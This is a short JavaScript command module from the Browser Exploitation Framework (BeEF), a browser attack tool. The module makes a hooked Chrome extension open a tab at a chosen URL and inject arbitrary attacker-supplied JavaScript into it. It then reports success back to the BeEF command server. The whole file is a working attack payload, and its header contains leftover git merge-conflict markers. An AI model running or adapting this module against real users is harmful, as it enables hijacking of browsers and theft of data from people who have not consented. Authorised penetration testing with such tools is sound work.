//
<<<<<<< HEAD
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	try{
		chrome.tabs.create({url:"<%= @url %>"}, function(tab){
			chrome.tabs.executeScript(tab.id,{code:"<%= @theJS %>"}, function(){
               beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Code executed on tab.id: ' + tab.id);
            });
		});
	} catch(error){
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Not inside of a Chrome Extension');
	}
});

